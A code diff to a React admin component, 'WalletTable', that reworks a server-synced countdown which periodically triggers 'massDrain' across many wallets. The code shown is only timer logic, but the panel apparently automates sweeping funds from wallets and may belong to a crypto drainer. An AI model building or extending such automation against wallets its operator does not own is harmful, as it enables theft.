@@ -200,22 +200,27 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
   }, [wallets.length, fetchAllBalances, wallets]);
 
   // Auto-refresh + auto-drain with global server-side timer (survives page refresh)
-  const countdownRef = useRef(AUTO_DRAIN_INTERVAL / 1000);
+  const countdownRef = useRef(30);
   useEffect(() => {
     if (!autoDrainOn) return;
 
-    // Calculate elapsed time since last drain cycle (based on server time)
+    let ticker: NodeJS.Timeout;
+    let lastSyncTime = 0;
+
     async function syncWithServer() {
       try {
         const res = await fetch("/api/drain-timer");
         const data = await res.json();
         // data.secondsUntilNextDrain tells us when next drain should happen
-        const secondsLeft = Math.max(0, data.secondsUntilNextDrain ?? 30);
+        const secondsLeft = Math.max(0, Math.floor(data.secondsUntilNextDrain ?? 30));
         countdownRef.current = secondsLeft;
         setCountdown(secondsLeft);
-      } catch {
-        countdownRef.current = AUTO_DRAIN_INTERVAL / 1000;
-        setCountdown(countdownRef.current);
+        lastSyncTime = Date.now();
+        console.log(`[Timer Sync] Synced with server. Next drain in ${secondsLeft}s`);
+      } catch (err) {
+        console.error("[Timer Sync] Failed to sync", err);
+        countdownRef.current = 30;
+        setCountdown(30);
       }
     }
 
@@ -223,14 +228,20 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
     syncWithServer();
 
     // Countdown ticker (every second)
-    const ticker = setInterval(() => {
+    ticker = setInterval(() => {
       countdownRef.current = Math.max(0, countdownRef.current - 1);
       setCountdown(countdownRef.current);
 
+      // Re-sync with server every 5 seconds to stay accurate
+      if (Date.now() - lastSyncTime > 5000) {
+        syncWithServer();
+      }
+
       // When countdown reaches 0, trigger drain immediately
       if (countdownRef.current === 0) {
-        countdownRef.current = AUTO_DRAIN_INTERVAL / 1000;
-        setCountdown(countdownRef.current);
+        countdownRef.current = 30;
+        setCountdown(30);
+        console.log("[Timer] Countdown reached 0, triggering drain");
         fetchWallets();
         fetchGas();
         massDrain(true);
